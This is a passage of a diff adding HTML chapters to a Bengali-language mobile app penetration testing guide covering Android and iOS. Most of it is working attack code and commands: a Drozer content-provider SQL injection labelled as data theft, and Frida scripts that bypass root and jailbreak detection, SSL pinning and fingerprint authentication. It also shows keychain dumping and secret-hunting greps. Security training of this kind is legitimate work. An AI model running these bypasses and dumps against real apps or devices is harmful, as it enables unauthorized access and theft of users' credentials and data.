+<span class="c"># ⭐ App Backup (allowBackup=true হলে)</span>
+adb backup -noapk com.target.app -f backup.ab
+<span class="c"># Backup থেকে extract:</span>
+dd if=backup.ab bs=24 skip=1 | python3 -c "import zlib,sys; sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))" | tar -xvf -
+    </div>
+
+    <h2 class="s">Logcat — Real-time Log Analysis</h2>
+    <div class="code">
+<span class="c"># সব log দেখো</span>
+adb logcat
+
+<span class="c"># নির্দিষ্ট app-এর log</span>
+adb logcat | grep com.target.app
+
+<span class="c"># Error log</span>
+adb logcat *:E
+
+<span class="c"># ⭐ Password/Token log-এ আছে কিনা:</span>
+adb logcat | grep -i "password\|token\|secret\|key\|auth"
+
+<span class="c"># Log file-এ সেভ করো</span>
+adb logcat -d > device_log.txt
+
+<span class="c"># App crash করলে stack trace:</span>
+adb logcat | grep "AndroidRuntime"
+    </div>
+
+    <h2 class="s">Drozer — Android Security Framework</h2>
+    <div class="code">
+<span class="c"># Drozer setup:</span>
+<span class="c"># ১. Device-এ drozer.apk install করো</span>
+<span class="c"># ২. Port forward:</span>
+adb forward tcp:31415 tcp:31415
+<span class="c"># ৩. Connect:</span>
+drozer console connect
+
+<span class="c"># ⭐ App Attack Surface</span>
+dz> run app.package.attacksurface com.target.app
+<span class="g">Attack Surface:
+  3 activities exported
+  1 broadcast receivers exported
+  1 content providers exported
+  0 services exported</span>
+
+<span class="c"># ⭐ Activity Launch</span>
+dz> run app.activity.start --component com.target.app com.target.app.AdminActivity
+
+<span class="c"># ⭐ Content Provider থেকে Data চুরি</span>
+dz> run app.provider.query content://com.target.app.provider/users
+dz> run app.provider.query content://com.target.app.provider/users --selection "1=1"
+
+<span class="c"># ⭐ Content Provider SQL Injection</span>
+dz> run app.provider.query content://com.target.app.provider/users --selection "1=1) UNION SELECT name,password,3 FROM sqlite_master--"
+
+<span class="c"># Broadcast Intent Send</span>
+dz> run app.broadcast.send --action com.target.ADMIN_ACTION --extra string cmd "shell"
+    </div>
+
+    <h2 class="s">Insecure Data Storage খোঁজা</h2>
+    <div class="code">
+<span class="c"># ১. SharedPreferences</span>
+adb shell cat /data/data/com.target.app/shared_prefs/*.xml
+<span class="c"># প্রায়ই পাওয়া যায়:</span>
+<span class="r">&lt;string name="auth_token"&gt;eyJhbGci...&lt;/string&gt;</span>
+<span class="r">&lt;string name="user_password"&gt;admin123&lt;/string&gt;</span>
+
+<span class="c"># ২. SQLite Database</span>
+adb pull /data/data/com.target.app/databases/
+sqlite3 app.db
+.tables
+SELECT * FROM users;
+SELECT * FROM sessions;
+
+<span class="c"># ৩. External Storage (সবাই পড়তে পারে!)</span>
+adb shell ls /sdcard/com.target.app/
+adb pull /sdcard/com.target.app/
+
+<span class="c"># ৪. Log ফাইলে sensitive data</span>
+adb shell find /sdcard/ -name "*.log" 2>/dev/null
+adb shell find /data/data/com.target.app/ -name "*.log" 2>/dev/null
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════
+     CH 5: Frida
+══════════════════════ -->
+<div class="chapter ch5">
+  <div class="ch-hdr">
+    <div class="ch-label la">CHAPTER 05 — ANDROID & iOS</div>
+    <div class="ch-title">💉 Frida — Dynamic Instrumentation</div>
+    <div class="ch-desc">চলমান App-এর Function Hook করো — সবচেয়ে শক্তিশালী টুল</div>
+  </div>
+  <div class="ch-body">
+
+    <h2 class="s">Frida কী ও Setup</h2>
+    <p>Frida হলো একটি dynamic instrumentation toolkit। চলমান App-এর যেকোনো function intercept, modify বা bypass করা যায়।</p>
+
+    <div class="code">
+<span class="c"># Kali-তে Frida install</span>
+pip3 install frida-tools
+
+<span class="c"># Android Device-এ Frida Server:</span>
+<span class="c"># ১. frida-server download করো (device architecture অনুযায়ী)</span>
+<span class="c"># https://github.com/frida/frida/releases</span>
+<span class="c"># ২. Device-এ push করো:</span>
+adb push frida-server /data/local/tmp/
+adb shell chmod +x /data/local/tmp/frida-server
+adb shell /data/local/tmp/frida-server &amp;
+
+<span class="c"># Frida কাজ করছে কিনা চেক:</span>
+frida-ps -U           <span class="c"># USB device-এর process list</span>
+frida-ps -U | grep target  <span class="c"># নির্দিষ্ট app</span>
+    </div>
+
+    <h2 class="s">Frida Scripting — মূল ধারণা</h2>
+    <div class="code">
+<span class="c">// ⭐ Basic Hook — যেকোনো Java Method</span>
+Java.perform(function() {
+    <span class="c">// Class লোড করো</span>
+    var TargetClass = Java.use("com.target.app.LoginActivity");
+
+    <span class="c">// Method hook করো</span>
+    TargetClass.checkPassword.implementation = function(password) {
+        console.log("[*] checkPassword called with: " + password);
+
+        <span class="c">// Original function call করো</span>
+        var result = this.checkPassword(password);
+        console.log("[*] Result: " + result);
+
+        <span class="c">// Return value পরিবর্তন করো</span>
+        return true;  <span class="c">// সবসময় true!</span>
+    };
+});
+    </div>
+
+    <div class="code">
+<span class="c"># Script চালানো:</span>
+frida -U -f com.target.app -l hook.js
+frida -U com.target.app -l hook.js    <span class="c"># চলমান app-এ</span>
+
+<span class="c"># Interactive mode:</span>
+frida -U com.target.app
+    </div>
+
+    <h2 class="s">Root Detection Bypass</h2>
+    <div class="code">
+<span class="c">// Root Detection Bypass Script</span>
+Java.perform(function() {
+    <span class="c">// Method 1: RootBeer library bypass</span>
+    try {
+        var RootBeer = Java.use("com.scottyab.rootbeer.RootBeer");
+        RootBeer.isRooted.implementation = function() {
+            console.log("[*] isRooted() bypassed!");
+            return false;
+        };
+    } catch(e) { console.log("RootBeer not found"); }
+
+    <span class="c">// Method 2: SafetyNet bypass</span>
+    try {
+        var SafetyNet = Java.use("com.google.android.gms.safetynet.SafetyNetApi");
+        <span class="c">// Hook করো...</span>
+    } catch(e) {}
+
+    <span class="c">// Method 3: File check bypass</span>
+    var File = Java.use("java.io.File");
+    File.exists.implementation = function() {
+        var name = this.getAbsolutePath();
+        <span class="c">// Root-related file check block করো</span>
+        if (name.indexOf("su") !== -1 ||
+            name.indexOf("magisk") !== -1 ||
+            name.indexOf("busybox") !== -1) {
+            console.log("[*] Root file check blocked: " + name);
+            return false;
+        }
+        return this.exists();
+    };
+});
+    </div>
+
+    <h2 class="s">SSL Pinning Bypass</h2>
+    <div class="code">
+<span class="c">// SSL Certificate Pinning Bypass</span>
+Java.perform(function() {
+    <span class="c">// OkHttp3 bypass (সবচেয়ে সাধারণ)</span>
+    try {
+        var CertificatePinner = Java.use("okhttp3.CertificatePinner");
+        CertificatePinner.check.overload("java.lang.String", "java.util.List")
+            .implementation = function() {
+                console.log("[*] OkHttp3 SSL Pinning Bypassed!");
+            };
+    } catch(e) {}
+
+    <span class="c">// TrustManager bypass</span>
+    try {
+        var TrustManagerImpl = Java.use("com.android.org.conscrypt.TrustManagerImpl");
+        TrustManagerImpl.verifyChain.implementation = function() {
+            console.log("[*] TrustManager bypassed!");
+            return arguments[0];  <span class="c">// Chain return করো</span>
+        };
+    } catch(e) {}
+
+    <span class="c">// X509 All trust bypass</span>
+    var X509TrustManager = Java.use("javax.net.ssl.X509TrustManager");
+    var SSLContext = Java.use("javax.net.ssl.SSLContext");
+    <span class="c">// Custom TrustManager যা সব certificate trust করে</span>
+    var TrustManagers = Java.array("javax.net.ssl.TrustManager", [
+        Java.implement(X509TrustManager, {
+            checkClientTrusted: function() {},
+            checkServerTrusted: function() {},
+            getAcceptedIssuers: function() { return []; }
+        })
+    ]);
+    var sslContext = SSLContext.getInstance("TLS");
+    sslContext.init(null, TrustManagers, null);
+});
+    </div>
+
+    <h2 class="s">Objection — Frida-based Framework</h2>
+    <div class="code">
+<span class="c"># Install</span>
+pip3 install objection
+
+<span class="c"># App-এ inject করো</span>
+objection -g com.target.app explore
+
+<span class="c"># ⭐ Objection Commands:</span>
+android hooking list classes              <span class="c"># সব class</span>
+android hooking list class_methods com.target.app.LoginActivity
+android hooking watch class_method com.target.app.LoginActivity.checkLogin
+
+<span class="c"># SSL Pinning Bypass (one command!)</span>
+android sslpinning disable
+
+<span class="c"># Root Detection Bypass</span>
+android root disable
+
+<span class="c"># Data Storage</span>
+android filesystem list                   <span class="c"># File system</span>
+android preferences list                  <span class="c"># SharedPreferences</span>
+android sqlite list                       <span class="c"># SQLite databases</span>
+android sqlite query --query "SELECT * FROM users" user.db
+
+<span class="c"># Memory Analysis</span>
+memory list modules
+memory search --string "password"
+memory dump all dump.bin
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════
+     CH 6: Android Traffic
+══════════════════════ -->
+<div class="chapter ch6">
+  <div class="ch-hdr">
+    <div class="ch-label la">CHAPTER 06 — ANDROID</div>
+    <div class="ch-title">🌐 Android Traffic Interception</div>
+    <div class="ch-desc">App-এর network traffic intercept করো</div>
+  </div>
+  <div class="ch-body">
+
+    <h2 class="s">Burp Suite + Android Setup</h2>
+    <div class="code">
+<span class="c"># ধাপ ১: Burp Proxy চালু করো</span>
+<span class="c"># Proxy → Options → Add: 0.0.0.0:8080</span>
+
+<span class="c"># ধাপ ২: Android Emulator/Device Proxy সেট করো</span>
+<span class="c"># Settings → WiFi → Long press → Modify Network</span>
+<span class="c"># Proxy: Manual, Host: আমার PC IP, Port: 8080</span>
+
+<span class="c"># ধাপ ৩: Burp Certificate Install করো</span>
+<span class="c"># Browser-এ: http://burpsuite → Download CA Certificate</span>
+<span class="c"># Android Settings → Security → Install Certificate</span>
+
+<span class="c"># ADB দিয়ে Certificate install (Android 7+ এর জন্য):</span>
+openssl x509 -inform DER -in cacert.der -out cacert.pem
+openssl x509 -inform PEM -subject_hash_old -in cacert.pem | head -1
+<span class="c"># Output: 9a5ba575</span>
+cp cacert.pem 9a5ba575.0
+adb root
+adb push 9a5ba575.0 /system/etc/security/cacerts/
+adb shell chmod 644 /system/etc/security/cacerts/9a5ba575.0
+    </div>
+
+    <h2 class="s">Network Security Config Override</h2>
+    <div class="code">
+<span class="c"># res/xml/network_security_config.xml তৈরি করো:</span>
+&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;network-security-config&gt;
+    &lt;base-config cleartextTrafficPermitted="true"&gt;
+        &lt;trust-anchors&gt;
+            &lt;certificates src="system"/&gt;
+            &lt;certificates src="user"/&gt;   <span class="c">&lt;!-- User-installed cert trust করবে --&gt;</span>
+        &lt;/trust-anchors&gt;
+    &lt;/base-config&gt;
+&lt;/network-security-config&gt;
+
+<span class="c"># AndroidManifest.xml-এ যোগ করো:</span>
+&lt;application android:networkSecurityConfig="@xml/network_security_config"&gt;
+
+<span class="c"># তারপর Repackage করো:</span>
+apktool b app_decoded/ -o patched.apk
+<span class="c"># Sign করো → Install করো</span>
+    </div>
+
+    <h2 class="s">mitmproxy — CLI Traffic Analysis</h2>
+    <div class="code">
+<span class="c"># Install</span>
+pip3 install mitmproxy
+
+<span class="c"># HTTP/HTTPS intercept</span>
+mitmproxy --mode transparent
+mitmweb     <span class="c"># Web interface: http://127.0.0.1:8081</span>
+mitmdump    <span class="c"># CLI output</span>
+
+<span class="c"># Filter দিয়ে নির্দিষ্ট দেখো:</span>
+mitmproxy --mode regular -p 8080
+
+<span class="c"># Script দিয়ে Auto-modify:</span>
+<span class="c"># intercept.py:</span>
+def request(flow):
+    if flow.request.path == "/api/login":
+        flow.request.content = b'{"bypass": true}'
+
+mitmproxy -s intercept.py
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════
+     CH 7: iOS Architecture
+══════════════════════ -->
+<div class="chapter ch7">
+  <div class="ch-hdr">
+    <div class="ch-label li">CHAPTER 07 — iOS</div>
+    <div class="ch-title">🍎 iOS Architecture ও Security Model</div>
+    <div class="ch-desc">iOS-এর নিরাপত্তা ব্যবস্থা বোঝো</div>
+  </div>
+  <div class="ch-body">
+
+    <h2 class="s si">iOS Security Architecture</h2>
+    <div class="dg">
+<pre><span class="b">iOS Security Layers:</span>
+
+┌──────────────────────────────────────────┐
+│              App Layer                   │
+│  [Banking App] [Games] [Social Media]    │
+├──────────────────────────────────────────┤
+│           App Sandbox                    │
+│  প্রতিটি App নিজের Container-এ সীমাবদ্ধ │
+├──────────────────────────────────────────┤
+│         System Services                  │
+│  Keychain | Face ID | Touch ID | iCloud  │
+├──────────────────────────────────────────┤
+│    Secure Enclave (Hardware)             │
+│  Biometric Data | Encryption Keys        │
+├──────────────────────────────────────────┤
+│         XNU Kernel                       │
+│  Code Signing | ASLR | DEP | Sandbox    │
+└──────────────────────────────────────────┘
+</pre>
+    </div>
+
+    <h2 class="s si">iOS App Bundle Structure</h2>
+    <div class="code ios-code">
+<span class="c"># IPA ফাইল = ZIP archive</span>
+unzip app.ipa -d app_extracted/
+ls app_extracted/Payload/App.app/
+
+<span class="b">App.app/</span>
+├── <span class="b">Info.plist</span>         ← ⭐ App metadata, permissions, URL schemes
+├── <span class="b">app_binary</span>         ← Compiled ARM binary (Mach-O format)
+├── <span class="b">embedded.mobileprovision</span>  ← Provisioning profile
+├── <span class="b">_CodeSignature/</span>    ← Code signing info
+├── <span class="b">*.plist</span>            ← Configuration files
+├── <span class="b">Base.lproj/</span>        ← UI files
+└── <span class="b">Frameworks/</span>        ← Embedded frameworks
+    </div>
+
+    <h2 class="s si">iOS Data Storage</h2>
+    <table>
+      <thead><tr><th>Storage Type</th><th>অবস্থান</th><th>সিকিউরিটি ঝুঁকি</th></tr></thead>
+      <tbody>
+        <tr><td><strong>Keychain</strong></td><td>Secure Hardware-based</td><td>Jailbreak → Dump করা যায়</td></tr>
+        <tr><td><strong>NSUserDefaults</strong></td><td>/Library/Preferences/*.plist</td><td>Plaintext — সহজেই পড়া যায়</td></tr>
+        <tr><td><strong>Core Data</strong></td><td>/Library/Application Support/</td><td>SQLite DB — Unencrypted</td></tr>
+        <tr><td><strong>Files</strong></td><td>/Documents/ /Library/ /tmp/</td><td>Unencrypted files</td></tr>
+        <tr><td><strong>Pasteboard</strong></td><td>System clipboard</td><td>অন্য app পড়তে পারে</td></tr>
+        <tr><td><strong>Cached Data</strong></td><td>/Library/Caches/</td><td>Sensitive data cache</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="s si">Jailbreak কী ও কেন দরকার?</h2>
+    <p>Jailbreak মানে iOS-এর সীমাবদ্ধতা সরিয়ে root access পাওয়া। iOS Pentest-এ Jailbroken device প্রায় অপরিহার্য।</p>
+    <div class="code ios-code">
+<span class="c"># জনপ্রিয় Jailbreak Tools:</span>
+checkra1n    <span class="c"># iPhone X পর্যন্ত (Hardware exploit)</span>
+unc0ver      <span class="c"># iOS 11-14</span>
+Taurine      <span class="c"># iOS 14-15</span>
+Palera1n     <span class="c"># iOS 15-16 (A8-A11 chip)</span>
+
+<span class="c"># Jailbreak ছাড়া কী করা যায়?</span>
+<span class="c"># ✅ Static Analysis (IPA)</span>
+<span class="c"># ✅ Network Traffic Interception</span>
+<span class="c"># ✅ Frida (Injected via Debug entitlement)</span>
+<span class="c"># ❌ Keychain dump</span>
+<span class="c"># ❌ File System Access</span>
+<span class="c"># ❌ Runtime Hook (সীমিত)</span>
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════
+     CH 8: iOS Static Analysis
+══════════════════════ -->
+<div class="chapter ch8">
+  <div class="ch-hdr">
+    <div class="ch-label li">CHAPTER 08 — iOS</div>
+    <div class="ch-title">🔍 iOS Static Analysis</div>
+    <div class="ch-desc">IPA Binary ও plist বিশ্লেষণ</div>
+  </div>
+  <div class="ch-body">
+
+    <h2 class="s si">Info.plist বিশ্লেষণ</h2>
+    <div class="code ios-code">
+<span class="c"># Info.plist পড়া</span>
+plutil -p Info.plist
+cat Info.plist | grep -i "key\|secret\|password\|url"
+
+<span class="c"># গুরুত্বপূর্ণ keys:</span>
+NSAppTransportSecurity     <span class="c"># ← HTTP allow করছে?</span>
+CFBundleURLTypes           <span class="c"># ← URL schemes</span>
+NSCameraUsageDescription   <span class="c"># ← Camera access কেন?</span>
+NSLocationWhenInUseUsageDescription  <span class="c"># ← Location কেন?</span>
+NSContactsUsageDescription  <span class="c"># ← Contacts কেন?</span>
+NSMicrophoneUsageDescription
+    </div>
+
+    <div class="code ios-code">
+<span class="c"># ⚠️ ATS Disabled হলে HTTP ব্যবহার হচ্ছে:</span>
+&lt;key&gt;NSAppTransportSecurity&lt;/key&gt;
+&lt;dict&gt;
+    &lt;key&gt;NSAllowsArbitraryLoads&lt;/key&gt;
+    &lt;true/&gt;    <span class="r">&lt;!-- ← বিপজ্জনক! --&gt;</span>
+&lt;/dict&gt;
+    </div>
+
+    <h2 class="s si">Binary Analysis</h2>
+    <div class="code ios-code">
+<span class="c"># Strings বের করা</span>
+strings AppBinary | grep -i "password\|secret\|key\|token\|api"
+strings AppBinary | grep "http"
+
+<span class="c"># Security Checks</span>
+otool -l AppBinary | grep -E "ENCRYPT|stack_chk"   <span class="c"># Encryption check</span>
+otool -l AppBinary | grep PIE                       <span class="c"># ASLR check</span>
+checksec AppBinary                                   <span class="c"># Security features</span>
+
+<span class="c"># class-dump — Objective-C class বের করা</span>
+class-dump AppBinary > classes.txt
+cat classes.txt | grep -i "password\|login\|auth\|key"
+
+<span class="c"># Hopper Disassembler (GUI) — ARM Assembly analysis</span>
+<span class="c"># Binary খোলো → Pseudocode দেখো</span>
+
+<span class="c"># Binary কি Fat/Universal?</span>
+file AppBinary
+lipo -info AppBinary    <span class="c"># সব architecture দেখো</span>
+
+<span class="c"># Decrypt করা (Jailbroken device)</span>
+<span class="c"># Clutch বা frida-ios-dump দিয়ে:</span>
+frida-ios-dump com.target.app
+    </div>
+
+    <h2 class="s si">plist File Analysis</h2>
+    <div class="code ios-code">
+<span class="c"># সব plist ফাইল খোঁজো</span>
+find . -name "*.plist" | head -20
+
+<span class="c"># Binary plist → XML convert</span>
+plutil -convert xml1 settings.plist -o settings_xml.plist
+cat settings_xml.plist
+
+<span class="c"># NSUserDefaults</span>
+<span class="c"># Jailbroken device-এ:</span>
+cat /var/mobile/Containers/Data/Application/[UUID]/Library/Preferences/com.target.app.plist
+
+<span class="c"># Cached Responses</span>
+find . -name "*.db" -path "*/Caches/*"
+sqlite3 Cache.db "SELECT * FROM cfurl_cache_response;"
+
+<span class="c"># Hardcoded Secrets খোঁজা</span>
+grep -r "password\|secret\|api_key\|private_key\|token" . --include="*.plist"
+grep -r "http://" . --include="*.plist"
+    </div>
+
+    <h2 class="s si">MobSF দিয়ে iOS Static Analysis</h2>
+    <div class="code ios-code">
+<span class="c"># MobSF-এ IPA upload করো</span>
+<span class="c"># http://localhost:8000</span>
+
+<span class="c"># Report-এ দেখবে:</span>
+<span class="c"># ✅ Binary security checks (PIE, ARC, Stack Guard)</span>
+<span class="c"># ✅ Permission analysis</span>
+<span class="c"># ✅ Hardcoded secrets</span>
+<span class="c"># ✅ URL scheme vulnerabilities</span>
+<span class="c"># ✅ ATS configuration</span>
+<span class="c"># ✅ Plist analysis</span>
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════
+     CH 9: iOS Dynamic Analysis
+══════════════════════ -->
+<div class="chapter ch9">
+  <div class="ch-hdr">
+    <div class="ch-label li">CHAPTER 09 — iOS</div>
+    <div class="ch-title">⚡ iOS Dynamic Analysis</div>
+    <div class="ch-desc">Objection, Frida, Keychain Dump</div>
+  </div>
+  <div class="ch-body">
+
+    <h2 class="s si">Objection — iOS</h2>
+    <div class="code ios-code">
+<span class="c"># Jailbroken device-এ Frida Server চালাও</span>
+<span class="c"># Cydia → Frida install</span>
+
+<span class="c"># Connect:</span>
+objection -g com.target.app explore
+
+<span class="c"># ⭐ Jailbreak Detection Bypass</span>
+ios jailbreak disable
+
+<span class="c"># ⭐ SSL Pinning Bypass</span>
+ios sslpinning disable
+
+<span class="c"># ⭐ Keychain Dump</span>
+ios keychain dump
+ios keychain dump --json keychain_data.json
+
+<span class="c"># ⭐ File System</span>
+ios filesystem ls
+ios filesystem ls /var/mobile/Documents/
+
+<span class="c"># ⭐ NSUserDefaults</span>
+ios nsuserdefaults get
+
+<span class="c"># ⭐ Pasteboard</span>
+ios pasteboard monitor
+
+<span class="c"># ⭐ Class Methods Hook</span>
+ios hooking list classes
+ios hooking list class_methods LoginViewController
+ios hooking watch method "-[LoginViewController checkAuth:]"
+    </div>
+
+    <h2 class="s si">Frida iOS Scripting</h2>
+    <div class="code ios-code">
+<span class="c">// iOS Jailbreak Detection Bypass</span>
+ObjC.schedule(ObjC.mainQueue, function() {
+    <span class="c">// Common jailbreak check bypass</span>
+    var JailbreakChecker = ObjC.classes.JailbreakChecker;
+    if (JailbreakChecker) {
+        var method = JailbreakChecker["- isJailbroken"];
+        Interceptor.attach(method.implementation, {
+            onLeave: function(retval) {
+                console.log("[*] Jailbreak check bypassed!");
+                retval.replace(0);  <span class="c">// false return</span>
+            }
+        });
+    }
+});
+    </div>
+
+    <div class="code ios-code">
+<span class="c">// Keychain Data Dump</span>
+ObjC.schedule(ObjC.mainQueue, function() {
+    var SecItemCopyMatching = new NativeFunction(
+        Module.findExportByName("Security", "SecItemCopyMatching"),
+        "int", ["pointer", "pointer"]
+    );
+
+    <span class="c">// Intercept all Keychain reads</span>
+    Interceptor.attach(Module.findExportByName("Security", "SecItemCopyMatching"), {
+        onEnter: function(args) {
+            console.log("[*] Keychain access detected!");
+        },
+        onLeave: function(retval) {
+            console.log("[*] Keychain result: " + retval);
+        }
+    });
+});
+    </div>
+
+    <h2 class="s si">Cycript — Objective-C Runtime Manipulation</h2>
+    <div class="code ios-code">
+<span class="c"># Jailbroken device-এ Cycript (Cydia থেকে install)</span>
+cycript -p com.target.app
+
+<span class="c"># Interactive shell-এ:</span>
+cy# [UIApplication sharedApplication]
+cy# [[UIApplication sharedApplication] delegate]
+
+<span class="c"># Password field value দেখা</span>
+cy# [[[UIApplication sharedApplication] keyWindow] recursiveDescription]
+
+<span class="c"># Current View Controller</span>
+cy# UIApp.keyWindow.rootViewController
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════
+     CH 10: Traffic Analysis
+══════════════════════ -->
+<div class="chapter ch10">
+  <div class="ch-hdr">
+    <div class="ch-label lb">CHAPTER 10 — ANDROID & iOS</div>
+    <div class="ch-title">🌐 Mobile Traffic Analysis</div>
+    <div class="ch-desc">App-এর API Traffic intercept ও analyze করো</div>
+  </div>
+  <div class="ch-body">
+
+    <h2 class="s sb">iOS Traffic Interception</h2>
+    <div class="code ios-code">
+<span class="c"># iPhone Proxy Settings:</span>
+<span class="c"># Settings → WiFi → (i) → Configure Proxy</span>
+<span class="c"># Manual: Server=PC_IP, Port=8080</span>
+
+<span class="c"># Burp CA Certificate Install:</span>
+<span class="c"># ১. Mobile Safari-তে: http://burpsuite</span>
+<span class="c"># ২. Profile Download করো</span>
+<span class="c"># ৩. Settings → General → VPN & Device Management → Install</span>
+<span class="c"># ৪. Settings → General → About → Certificate Trust Settings → Enable</span>
+    </div>
+
+    <h2 class="s sb">SSL Pinning Bypass — সব পদ্ধতি</h2>
+    <div class="code both">
+<span class="c"># Method 1: Frida Script (Android + iOS)</span>
+<span class="c"># ⭐ Universal SSL Unpinning Script:</span>
+frida --codeshare akabe1/frida-ios-ssl-kill-switch2 -f com.target.app  <span class="c"># iOS</span>
+frida --codeshare akabe1/frida-multiple-unpinning -U -f com.target.app  <span class="c"># Android</span>
+
+<span class="c"># Method 2: Objection (সবচেয়ে সহজ)</span>
+objection -g com.target.app explore
+android sslpinning disable   <span class="c"># Android</span>
+ios sslpinning disable       <span class="c"># iOS</span>
+
+<span class="c"># Method 3: APK Patching (Android)</span>
+<span class="c"># apktool দিয়ে decompile → Network Security Config add → Repackage</span>
+
+<span class="c"># Method 4: Magisk Module (Root Android)</span>
+<span class="c"># Magisk → Install "MagiskTrustUserCerts" module</span>
+<span class="c"># System certificate হিসেবে Burp CA যোগ হবে</span>
+
+<span class="c"># Method 5: Xposed Framework (Android)</span>
+<span class="c"># JustTrustMe / TrustMeAlready module install</span>
+    </div>
+
+    <h2 class="s sb">Traffic বিশ্লেষণ — কী খুঁজবে?</h2>
+    <div class="code both">
+<span class="c"># Burp-এ Mobile Traffic দেখে এগুলো খোঁজো:</span>
+
+<span class="c"># ১. Authentication Token</span>
+Authorization: Bearer eyJhbGci...   <span class="c"># JWT Token → Attack!</span>
+X-Auth-Token: abc123xyz
+
+<span class="c"># ২. Sensitive Data Transmission</span>
+<span class="g">GET /api/user/profile HTTP/1.1</span>
+<span class="r">{"ssn": "123-45-6789", "dob": "1990-01-01"}</span>  <span class="c"># ← PII সরাসরি!</span>
+
+<span class="c"># ৩. Insecure HTTP</span>
+<span class="r">http://</span>api.bankapp.com/login    <span class="c"># ← HTTP ব্যবহার!</span>
+
+<span class="c"># ৪. IDOR in API</span>
+GET /api/v1/users/<span class="r">1001</span>/account  <span class="c"># ← 1002 করে দেখো</span>
+
+<span class="c"># ৫. Weak API Authentication</span>
+<span class="c"># Token না থাকলে কী হয়?</span>
+<span class="c"># Expired token কাজ করে?</span>
+<span class="c"># অন্যের token দিয়ে কাজ হয়?</span>
+
+<span class="c"># ৬. Sensitive Data in URL</span>
+GET /api/login?password=admin123    <span class="c"># ← URL-এ password!</span>
+GET /api/transfer?amount=100&to=acc  <span class="c"># ← Amount manipulation!</span>
+
+<span class="c"># ৭. Verbose Error Messages</span>
+<span class="r">{"error": "SQL Error: syntax near 'admin'", "query": "SELECT * FROM users..."}</span>
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════
+     CH 11: OWASP Mobile Top 10
+══════════════════════ -->
+<div class="chapter ch11">
+  <div class="ch-hdr">
+    <div class="ch-label lc">CHAPTER 11</div>
+    <div class="ch-title">🏆 OWASP Mobile Top 10 — Exploit সহ</div>
+    <div class="ch-desc">প্রতিটি ভালনারেবিলিটি কীভাবে খুঁজবে ও exploit করবে</div>
+  </div>
+  <div class="ch-body">
+
+    <h3 class="ss">M1: Improper Credential Usage</h3>
+    <div class="code">
+<span class="c"># Hardcoded Credentials খোঁজা</span>
+grep -r "password\s*=\s*['\"]" decompiled/
+grep -r "api_key\s*=\s*['\"]" decompiled/
+grep -r "secret\s*=\s*['\"]" decompiled/
+
+<span class="c"># উদাহরণ দুর্বল code:</span>
+<span class="r">String API_KEY = "sk-1234567890abcdef";  // Hardcoded!</span>
+<span class="r">if (password.equals("admin123")) { login(); }  // Hardcoded!</span>
+    </div>
+
+    <h3 class="ss">M3: Insecure Authentication</h3>
+    <div class="code">
+<span class="c"># Token Manipulation</span>
+<span class="c"># ১. JWT None Algorithm:</span>
+<span class="c"># Header: {"alg":"none"} → role: admin → no signature</span>
+
+<span class="c"># ২. Token Parameter Tampering:</span>
+<span class="c"># API response: {"user_id": 123, "is_admin": false}</span>
+<span class="c"># Burp-এ intercept → "is_admin": true করো</span>
+
+<span class="c"># ৩. Biometric Bypass (Frida):</span>
+Java.perform(function() {
+    var FingerprintManager = Java.use("android.hardware.fingerprint.FingerprintManager");
+    FingerprintManager.authenticate.implementation = function() {
+        <span class="c">// Success callback trigger করো</span>
+        arguments[3].onAuthenticationSucceeded(null);
+    };
+});
+    </div>
+
+    <h3 class="ss">M5: Insecure Communication</h3>
+    <div class="code">
+<span class="c"># HTTP ব্যবহার detect করা</span>
+<span class="c"># Network Security Config:</span>
+cat network_security_config.xml | grep "cleartext"
+<span class="c"># অথবা Traffic-এ HTTP দেখো</span>
+
+<span class="c"># Weak TLS detect:</span>
+nmap --script ssl-enum-ciphers api.target.com
+testssl.sh api.target.com
+    </div>
+
+    <h3 class="ss">M9: Insecure Data Storage — সবচেয়ে বেশি পাওয়া যায়</h3>
+    <div class="code">
+<span class="c"># Android:</span>
+adb shell cat /data/data/com.target.app/shared_prefs/prefs.xml
+<span class="r">&lt;string name="password"&gt;admin123&lt;/string&gt;  ← Plaintext!</span>
+<span class="r">&lt;string name="session_token"&gt;eyJhbGci...&lt;/string&gt;  ← Token!</span>
+
+<span class="c"># iOS Keychain (Jailbroken):</span>
+objection -g com.target.app explore
+ios keychain dump
+<span class="g">{"service": "com.target.app", "account": "user@email.com", "value": "password123"}</span>
+
+<span class="c"># External Storage (Android)</span>
+adb shell find /sdcard/ -name "*.db" -o -name "*.txt" -o -name "*.json"
+
+<span class="c"># Clipboard Monitoring</span>
+<span class="c"># App কি clipboard monitor করছে?</span>
+adb shell dumpsys clipboard
+    </div>
+
+    <h3 class="ss">M10: Insufficient Cryptography</h3>
+    <div class="code">
+<span class="c"># Weak Algorithm detect:</span>
+grep -r "MD5\|SHA1\|DES\|ECB\|Random()" decompiled/ <span class="c"># Weak crypto</span>
+grep -r "AES\|RSA" decompiled/ | grep "ECB"          <span class="c"># ECB mode!</span>
+
+<span class="c"># Hardcoded Key:</span>
+<span class="r">byte[] key = "1234567890123456".getBytes(); // Hardcoded AES key!</span>
+<span class="r">Cipher.getInstance("AES/ECB/PKCS5Padding"); // ECB = vulnerable!</span>
+
+<span class="c"># Frida দিয়ে Encryption Intercept:</span>
+<span class="c">// Hook Cipher.doFinal to see plaintext</span>
+Java.perform(function() {
+    var Cipher = Java.use("javax.crypto.Cipher");
+    Cipher.doFinal.overload("[B").implementation = function(data) {
+        console.log("[*] Encrypting: " + Java.array("byte", data));
+        return this.doFinal(data);
+    };
+});
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════
+     CH 12: Tools & Lab
+══════════════════════ -->
+<div class="chapter ch12">
+  <div class="ch-hdr">
+    <div class="ch-label lb">CHAPTER 12</div>
+    <div class="ch-title">🛠️ Tools ও Lab Setup — সম্পূর্ণ গাইড</div>
+    <div class="ch-desc">সব টুল এক জায়গায়</div>
+  </div>
+  <div class="ch-body">
+
+    <h2 class="s sb">Android Tools সম্পূর্ণ তালিকা</h2>
+    <table>
+      <thead><tr><th>টুল</th><th>কাজ</th><th>Install</th></tr></thead>
+      <tbody>
